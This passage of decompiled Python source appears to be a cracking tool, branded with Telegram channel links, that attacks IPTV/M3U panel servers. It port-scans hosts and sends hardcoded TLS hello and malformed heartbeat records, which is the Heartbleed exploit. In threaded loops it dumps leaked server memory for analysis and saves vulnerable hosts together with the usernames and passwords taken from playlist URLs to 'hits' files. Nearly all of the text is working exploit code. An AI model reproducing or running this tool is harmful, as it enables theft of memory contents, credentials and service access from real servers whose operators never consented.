                        self.writeDebugCode(cadena + "\n\t" + datos)


class DataOutputGenerator:
    pass


iphit = 0
start = 0

class PanelAttack_SSL:
    hello = " \n            16 03 02 00  dc 01 00 00 d8 03 02 53\n            43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf\n            bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00\n            00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88\n            00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c\n            c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09\n            c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44\n            c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c\n            c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11\n            00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04\n            03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19\n            00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08\n            00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13\n            00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00\n            00 0f 00 01 01                                  \n            "
    hb = " \n            18 03 02 00 03\n            01 40 00\n            "
    miOutputFileWriter: OutputFileWriter
    puertoINICIO_SCAN = _puertoINICIO_SCAN
    puertoFIN_SCAN = _puertoFIN_SCAN
    primeraVEZ_VULNERABLES = True

    def setDataContainer(self, _dataC: DataContainer):
        self.miProductor = _dataC

    def decoceStringToHEX(self, entrada):
        return decode_hex(entrada.replace(" ", "").replace("\n", ""))[0]

    def hexdump(self, s):
        for b in range(0, len(s), 16):
            lin = [c for c in s[b:b + 16]]
            hxdat = " ".join("%02X" % c for c in lin)
            pdat = "".join(chr(c) if 32 <= c <= 126 else "" for c in lin)

    def recvall(self, s, length, timeout=5):
        endtime = time.time() + timeout
        rdata = b''
        try:
            remain = length
            while remain > 0:
                rtime = endtime - time.time()
                if rtime < 0:
                    return
                r, w, e = select.select([s], [], [], 5)
                if s in r:
                    data = s.recv(remain)
                    if not data:
                        return
                    rdata += data
                    remain -= len(data)

            return rdata
        except Exception as errp:
            if debug:
                print("recvall--->error reading data from socket", errp)
            return

    def recvmsg(self, s):
        hdr = self.recvall(s, 5)
        if hdr is None:
            if debug:
                print("HDR Unexpected EOF receiving record header - server closed connection")
            return (None, None, None)
        else:
            typ, ver, ln = struct.unpack(">BHH", hdr)
            pay = self.recvall(s, ln, 10)
            if pay is None:
                if debug:
                    print("\t\tpayload Unexpected EOF receiving record payload - server closed connection")
                return (None, None, None)
            return (
             typ, ver, pay)

    def hit_hb(self, s):
        data = self.decoceStringToHEX(self.hb)
        s.send(data)
        while 1:
            typ, ver, pay = self.recvmsg(s)
            if typ is None:
                print("\t\tNo HB response received, server likely not vulnerable")
                return False
            if typ == 24:
                print("\t\tReceived HB response:")
                self.hexdump(pay)
                if len(pay) > 3:
                    print("\n\n\t\t" + Fore.GREEN + "Server is vulnerable!" + Fore.RESET)
                else:
                    print("\t\t Server processed malformed data-hello-, but did not return any extra data.")
                return True
            if typ == 21:
                print("Received alert:")
                self.hexdump(pay)
                print("The server returned an error, probably not vulnerable")
                return False

    def do_hb_new(self, s):
        while 1:
            cadena = "\x1b[37mReading data from the server\x1b[32m" + str(s.getpeername()) + "\x1b[0m"
            typ, ver, pay = self.recvmsg(s)
            if typ is None:
                if debug:
                    print("do_hb_new => No heartbeat response received, server is probably not vulnerable")
                return False
            if typ == 24:
                if len(pay) > 3:
                    pdat = "".join(chr(c) if 32 <= c <= 126 or c == 10 or c == 13 else "" for c in pay)
                    if debug:
                        self.miOutputFileWriter.writeToFile(pdat)
                    if len(pdat) > 50:
                        self.miProductor.put(pdat)
                else:
                    print("Server processed malformed HB but did not return any extra data.")
                return True
            if typ == 21:
                if debug:
                    print("do_hb_new => Alert received:")
                self.hexdumpText(pay)

    def checkHB(self, _url, port: int, _socket: socket):
        print("   Checking vulnerability:", _url)
        _socket.connect((_url, port))
        print(f"{VDC}   Sending Client Hello...{RST}")
        sys.stdout.flush()
        _socket.send(self.decoceStringToHEX(self.hello))
        print(f"{AC}   Waiting for Server Hello...{RST}")
        sys.stdout.flush()
        _continue = True
        while _continue:
            typ, ver, pay = self.recvmsg(_socket)
            if typ != None:
                print(f"\n{VD}   Message received....{RST}")
                print(f"{MC}   Checking pay HB...{RST}")
                time.sleep(1)
                if typ == 22 and pay[0] == 14:
                    print(" \x1b[32m Sending heartbeat request...\x1b[0m")
                    sys.stdout.flush()
                    data = self.decoceStringToHEX(self.hb)
                    _socket.send(data)
                    if self.hit_hb(_socket):
                        return True
            else:
                print("\x1b[31m Connection closed on the server\n Server Hello was not sent.\x1b[0m")
                _continue = False

    def extractPort(self, url, _scaneoLento):
        miPortScanner = PortScanner()
        url = url.replace("/", "")
        listapuertos = miPortScanner.port_scan(url, range(self.puertoINICIO_SCAN, self.puertoFIN_SCAN), _scaneoLento)
        return listapuertos

    def checkServerStatus(self, simpleServer):
        estado, url, port, protocolo = checkFullM3U_URL(simpleServer, requests.session())
        return (estado, url, port, protocolo)

    def iniciarHilos(self, url, _listaservers, _listapuertos, puertoBase, protocolo, _miDS: DatosServerM3U, _dataContainer: DataContainer, _dictCombos):
        self.setDataContainer(_dataContainer)
        miCosumidor = DataAnalyzer()
        miCosumidor.setDataContainer(_dataContainer)
        miCosumidor.setCombosCotainer(_dictCombos)
        datosServidor = urlparse(url)
        miCosumidor.setURLBase(_miDS)
        diccionarioAnterior = miCosumidor.readComboFromFile(_dictCombos)
        for total in range(totalHilosProductores):
            hiloextractor = threading.Thread(name=("Extractor-" + str(total)), target=(self.doSimpleAtaque), args=(url, _listapuertos, _miDS))
            hiloextractor.start()

        for number in range(totalHilosConsumidores):
            hiloConsumidor = threading.Thread(name=("Bᴏᴛ" + str(number)), target=(miCosumidor.doAnalyze))
            hiloConsumidor.start()

    def escribirDatosServerVulnerable(self, datos, datos1, ServerHit):
        global iphit
        global start
        miDS_Host = None
        if "IP Exploit > " in datos:
            start = datos.find("IP Exploit > ") + len("IP Exploit > ")
            end = datos.find("\n", start)
            miDS_Host = datos[start:end]
        elif miDS_Host:
            file_name = hits + "vulnerable.IP" + ServerHit.replace("http://", "_").replace("https://", "_").replace(":", ".").replace("_//", "_Test_Single_IP").replace("//", "_Test_Single_IP") + ".txt"
            if os.path.isfile(file_name):
                with open(file_name, "r", encoding="utf-8") as f:
                    if miDS_Host in f.read():
                        print(f"\n{A} IP >{RST} {miDS_Host}\n {M}already exists in file\n skipping save to file{RST}\n")
                        time.sleep(2)
                    else:
                        iphit += 1
                        with open(file_name, "a", encoding="utf-8") as f:
                            f.write("\n║" + datos1 + "\n║")
                            print(f"\n{A} IP >{RST} {miDS_Host}\n {M} Save to file{RST}\n")
                            time.sleep(2)
            else:
                iphit += 1
                with open(file_name, "w", encoding="utf-8") as f:
                    f.write("▂▂✭𝕬_𝖕𝖝𝖑𝖑 🐉 𝖊𝖝𝖕𝖑𝖔𝖎𝖙 ✭▂▂\n╓❪❖ [ https://t.me/+n8ZcWSyfV3MzN2I0 ●  ] \n║")
                    f.write("\n" + datos + "\n║\n║❖︎ Gᴇᴛ-ᴘʏ☟︎︎︎ \u200c🇪\u200c🇽\u200c🇵\u200c🇱\u200c🇴\u200c🇮\u200c🇹 \u200a ❖︎-ᴘʏ\n║❖︎ [https://t.me/CRACKANDROID]\n╚❪✪»  ᴘʏ ᴄᴏɴғɪɢ ☝︎ ᴘʏᴛʜᴏɴ  «✪❫ ")
        else:
            print("Error: Could not extract miDS.Host from data")
        return True

    def pasoUNO(self, _url):
        miDS = DatosServerM3U()
        miDS.extraerServerFinal(_url)
        print(miDS)
        return miDS

    def iniciarMultiServer(self, url, simpleServer, simplePort, puertoBaseURL, protocolo, miDS: DatosServerM3U):
        miDataContainer = DataContainer()
        miDictCombos = dict()
        for server in miDS.host:
            miDSAUX = copy.copy(miDS)
            miDSAUX.host = server
            self.miOutputFileWriter = OutputFileWriter()
            self.miOutputFileWriter.initValues(miDS.panelHost + ":" + str(puertoBaseURL))
            self.iniciarHilos(url, simpleServer, simplePort, puertoBaseURL, protocolo, miDSAUX, miDataContainer, miDictCombos)

    def startAttack(self, _listaserver: str, _listapuertosEntrada):
        global escribirDatosServerVulnerable_used
        global respueta
        global start
        s = socket(AF_INET, SOCK_STREAM)
        estado = ""
        puertoBaseURL = ""
        protocolo = ""
        estado = ""
        url = ""
        serversAtacables = dict()
        esSolo_Server_conIP = False
        scaneoLento = 1
        if selectm != "3":
            try:
                if len(_listapuertosEntrada) <= 0:
                    cls()
                    #print(logopic)
                    print("\x1b[91;5;235m  ⚙️ waiting...  \n\x1b[0m")
            except:
                scaneoLento = 1

            for simpleServer in _listaserver:
                url = ""
                if not simpleServer.find("m3u") == -1:
                    miDS = self.pasoUNO(simpleServer)
                    respueta = ""
                    if respueta != "":
                        if _listapuertosEntrada == "":
                            print("\x1b[31mYou must enter a unique port to attack several servers!!!\x1b[31m")
                        miDS.host = respueta.split(" ")
                        if len(miDS.host) > 1:
                            self.iniciarMultiServer(url, simpleServer, _listapuertosEntrada[0], puertoBaseURL, protocolo, miDS)
                            estado = "KO"
                        else:
                            miDS.host = miDS.host[0]
                        estado = "OK"
                        if miDS.host == "":
                            print("\x1b[31mM3U URL does not validate, unable to validate real m3u SERVER, attacking dns IP\x1b[0m")
                            resultadoParser = urlparse(simpleServer)
                            estado = "OK"
                            url = resultadoParser.hostname
                            if resultadoParser.port != "":
                                puertoBaseURL = resultadoParser.port
                            protocolo = resultadoParser.scheme
                    else:
                        miDS = self.pasoUNO(simpleServer)
                        esSolo_Server_conIP = True
                        resultadoParser = urlparse(simpleServer)
                        url = resultadoParser.hostname
                        if url == None:
                            url = resultadoParser.path
                        if resultadoParser.port != None:
                            puertoBaseURL = resultadoParser.port
                        if resultadoParser.scheme == "":
                            protocolo = "http"
                        else:
                            protocolo = resultadoParser.scheme
                        estado = "OK"
                    estado = "OK"
                    temporalScanPuerto = {}

            if not estado == "KO":
                scaneoLento = 1
                if len(_listapuertosEntrada) == 0:
                    port_to_scan = self.extractPort(miDS.host, scaneoLento)
                    temporalScanPuerto = port_to_scan
            else:
                port_to_scan = _listapuertosEntrada
            print("Found Port \x1b[33m", miDS.host, "\x1b[0m ==> ", port_to_scan)
            if len(port_to_scan) > 0:
                for simplePort in port_to_scan:
                    print("\n Testing URL==> ", simpleServer, "\n Testing Port==> \x1b[33m", simplePort, "\x1b[0m")
                    try:
                        if self.checkHB(miDS.host, simplePort, s):
                            print("Vulnerable Port to use:", simplePort)
                            parsed_url = urlparse(simpleServer)
                            query_params = parse_qs(parsed_url.query)
                            if selectm != "3":
                                username = query_params["username"][0]
                                password = query_params["password"][0]
                            else:
                                username = "Saw-X"
                                password = "Saw-X"
                            ServerHit = parsed_url.scheme + "://" + parsed_url.netloc
                            datos = "╠❖︎ Testing > " + ServerHit + "\n║❖︎ Username > " + username + "\n║︎❖ Password > " + password + "\n║\n║\n╠❖︎ IP Exploit > " + miDS.host + "\n╠❖︎ Port Exploit > " + str(simplePort)
                            datos1 = "\n╠❖︎ IP Exploit > " + miDS.host + "\n╠❖︎ Port Exploit > " + str(simplePort)
                            self.escribirDatosServerVulnerable(datos, datos1, ServerHit)
                            escribirDatosServerVulnerable_used = True
                            miDataContainer = DataContainer()
                            miDictCombos = dict()
                            self.miOutputFileWriter = OutputFileWriter()
                            self.miOutputFileWriter.initValues(miDS.panelHost + ":" + str(puertoBaseURL))
                            self.iniciarHilos(url, simpleServer, simplePort, puertoBaseURL, protocolo, miDS, miDataContainer, miDictCombos)
                            break
                        else:
                            try:
                                s.close()
                                s = socket(AF_INET, SOCK_STREAM)
                            except Exception as errp:
                                print("Error closing socket:", errp)

                    except Exception as errp:
                        s.close()
                        s = socket(AF_INET, SOCK_STREAM)
                        print("\t\t***********Error:", errp)

            else:
                print("Server:", url, "no ports found")
        else:
            for simpleServer in _listaserver:
                url = ""
                listaserver = 1
                if not simpleServer.find("m3u") == -1 or listaserver == 1:
                    miDS = self.pasoUNO(simpleServer)
                    print("\n ❖︎ Servidor remoto encontrado > ", miDS.host)
                    respueta = respueta
                    if respueta != "":
                        miDS.host = respueta.split(" ")
                        if len(miDS.host) > 1:
                            self.iniciarMultiServer(url, simpleServer, _listapuertosEntrada[0], puertoBaseURL, protocolo, miDS)
                            estado = "KO"
                        else:
                            miDS.host = miDS.host[0]
                        estado = "OK"
                        if miDS.host == "":
                            print(Fore.RED, "M3U URL does not validate, cannot validate real m3u SERVER, attacking DNS IP", Fore.RESET)
                            resultadoParser = urlparse(simpleServer)
                            estado = "OK"
                            url = resultadoParser.hostname
                            if resultadoParser.port != "":
                                puertoBaseURL = resultadoParser.port
                            protocolo = resultadoParser.scheme
                    else:
                        miDS = self.pasoUNO(simpleServer)
                        esSolo_Server_conIP = True
                        resultadoParser = urlparse(simpleServer)
                        url = resultadoParser.hostname
                        if url == None:
                            url = resultadoParser.path
                        if resultadoParser.port != None:
                            puertoBaseURL = resultadoParser.port
                        if resultadoParser.scheme == "":
                            protocolo = "http"
                        else:
                            protocolo = resultadoParser.scheme
                        estado = "OK"
                    estado = "OK"
                    temporalScanPuerto = {}

            if not estado == "KO":
                scaneoLento = 1
                if len(_listapuertosEntrada) == 0:
                    port_to_scan = self.extractPort(miDS.host, scaneoLento)
                    temporalScanPuerto = port_to_scan
                else:
                    port_to_scan = _listapuertosEntrada
                print("Found Port \x1b[33m", miDS.host, "\x1b[0m ==> ", port_to_scan)
                if len(port_to_scan) > 0:
                    for simplePort in port_to_scan:
                        print("\n Testing URL==> ", simpleServer, "\n Testing Port==> \x1b[33m", simplePort, "\x1b[0m")
                        try:
                            if self.checkHB(miDS.host, simplePort, s):
                                print("Vulnerable Port to use:", simplePort)
                                parsed_url = urlparse(simpleServer)
                                query_params = parse_qs(parsed_url.query)
                                if selectm != "3":
                                    username = query_params["username"][0]
                                    password = query_params["password"][0]
                                else:
                                    username = "Saw-X"
                                    password = "Saw-X"
                                ServerHit = parsed_url.scheme + "://" + parsed_url.netloc
                                datos = "╠❖︎ Testing > " + ServerHit + "\n║ ❖︎ Username > " + username + "\n║ ❖︎ Password > " + password + "\n║\n║\n╠❖︎ P Exploit > " + miDS.host + "\n╠❖︎ Port Exploit > " + str(simplePort)
                                datos1 = "\n╠❖︎ IP Exploit > " + miDS.host + "\n╠❖︎ Port Exploit > " + str(simplePort)
                                self.escribirDatosServerVulnerable(datos, datos1, ServerHit)
                                escribirDatosServerVulnerable_used = True
                                miDataContainer = DataContainer()
                                miDictCombos = dict()
                                self.miOutputFileWriter = OutputFileWriter()
                                self.miOutputFileWriter.initValues(miDS.panelHost + ":" + str(puertoBaseURL))
                                self.iniciarHilos(url, simpleServer, simplePort, puertoBaseURL, protocolo, miDS, miDataContainer, miDictCombos)
                                break
                            else:
                                try:
                                    s.close()
                                    s = socket(AF_INET, SOCK_STREAM)
                                except Exception as errp:
                                    print("Error closing socket:", errp)

                        except Exception as errp:
                            s.close()
                            s = socket(AF_INET, SOCK_STREAM)
                            print("\t\t***********Error:", errp)

                else:
                    print("Server:", url, "no ports found")
            start += 1
            print("Vulnerable servers:", serversAtacables)
        if selectm != "3":
            if not escribirDatosServerVulnerable_used:
                cls()
                print(APXLL)
                print(f"{VC} No vulnerable IP found {RST}")
                print(f"\n{AC} Tᴇɴᴛᴀᴛɪᴠᴀs > {RST} {start}")
                time.sleep(4)

                def inciar(listaserver, listapuertos):
                    listaserver = str(simpleServer).split()
                    server_input = listaserver
                    listapuertos = ""
                    miPanelAttack_SSL = PanelAttack_SSL()
                    miPanelAttack_SSL.startAttack(listaserver, listapuertos)

                inciar({}, {})

    def doSimpleAtaque(self, url: str, simplePort, _miDS: DatosServerM3U):
        cadena = Fore.GREEN + "\n ❖︎ Starting attack on  > " + _miDS.m3uURL + Fore.WHITE + "\n ❖︎ Against the server > " + Fore.YELLOW + _miDS.host + Fore.RESET + "\n"
        print(cadena)
        while True:
            try:
                servidor = url
                if _miDS.host != "":
                    servidor = _miDS.host
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((servidor, simplePort))
                s.send(self.decoceStringToHEX(self.hello))
                while 1:
                    typ, ver, pay = self.recvmsg(s)
                    if typ == None:
                        if debug:
                            print("Server closed connection without sending Server Hello.")
                        return
                    if typ == 22:
                        if pay[0] == 14:
                            break

                i = 0
                while os.path.exists("dump_%s.bin" % i):
                    i += 1

                s.send(self.decoceStringToHEX(self.hb))
                while self.do_hb_new(s):
                    continue

            except Exception as errp:
                if debug:
                    print("Error making connection, we keep trying:", errp)


def inciar(listaserver, listapuertos):
    global respueta
    global selectm
    cls()
    #print(logopic)
    print(cadena)
    print(f"\n❖︎Enter port check > {VD} {scanPORTTYPE} {RST}")
    if len(listaserver) == 0:
        selectm = input(f"\n\n{VC}❖︎ 1 Lista m3u (defaut) \n{VDC}❖︎ 2 user/pass URL address \n{VC}❖︎ 3 Vulnerable URL custom IP \n\n\x1b[0m ❖ Choice \x1b[91m\x1b[1m ➠ \x1b[0m \x1b[0m{RST}")
        if selectm == "2":
            cls()
            #print(logopic)
            print(cadena)
            print(f"\n❖︎Enter port check > {VD} {scanPORTTYPE} {RST}")
            URL = ""
            user = ""
            passw = ""
            URL = input("\n\n\n URL Address > ")
            tags = ['https://', 'http://', '/c/', '/c', ' ']
            for tag in tags:
                URL = URL.replace(tag, "")

            user = input(f"{VDC} Username > {RST}")
            passw = input(f"{VC} Password > {RST}")
            listaserver = str("http://" + URL + "/get.php?username=" + user + "&password=" + passw + "&type=m3u").split()
            listapuertos = ""
        elif selectm == "3":
            cls()
            #print(logopic)
            print(cadena)
            print(f"\n❖︎Enter port check > {VD} {scanPORTTYPE} {RST}")
            listaserver = list(map(str, input(Fore.RED + Back.BLACK + "\n\n\n❖︎ Enter URL ❖︎ \n➥ " + Fore.GREEN).split()))
            respueta = input(Fore.RED + "\n❖︎ Write custom IP ❖︎ \n➥ " + Fore.GREEN)
            listapuertos = ""
        else:
            cls()
            #print(logopic)
            print(cadena)
            print(f"\n❖︎Enter port check > {VD} {scanPORTTYPE} {RST}")
            listaserver = list(map(str, input(Fore.RED + Back.BLACK + "\n\n\n❖︎ Enter m3u playlist ❖︎ \n➥ \x1b" + Fore.GREEN).split()))
            listapuertos = ""
    if len(listaserver) == 0:
        print(Fore.RED, "Wrong parameters. Verify input data")
        quit()
    miPanelAttack_SSL = PanelAttack_SSL()
    miPanelAttack_SSL.startAttack(listaserver, listapuertos)


lines = [
 f"\n{RST}\n"]
for line in lines:
    for c in line:
        print(c, end="")
        sys.stdout.flush()
        time.sleep(uniform(0, 0.01))

    print("")

print(cadena)
print("\n\x1b[41m Enter Nick  \n")
nick = input("\x1b[0m ◌ Nick \x1b[91m\x1b[1m ➠ \x1b[0m \x1b[0m")
if nick == "":
    nick = "https://t.me/+n8ZcWSyfV3MzN2I0"
print(Fore.RED + Back.BLACK + "\n\n\n❖ Scanner Type :")
print(Fore.GREEN + Back.BLACK + "\n❖ 0 ➢Local(default) Or 1 ➢WEB  ")
try:
    tipo = int(input("\x1b[0m ❖ Please write a number  \x1b[91m\x1b[1m ➠ \x1b[0m \x1b[0m "))
    if tipo != "":
        if int(tipo) == 1:
            scanPORTTYPE = "WEB"
except:
    pass

inciar({}, {})

# okay decompiling 4K.EXPLOITUltra@APXLL-1_decoded.pyc
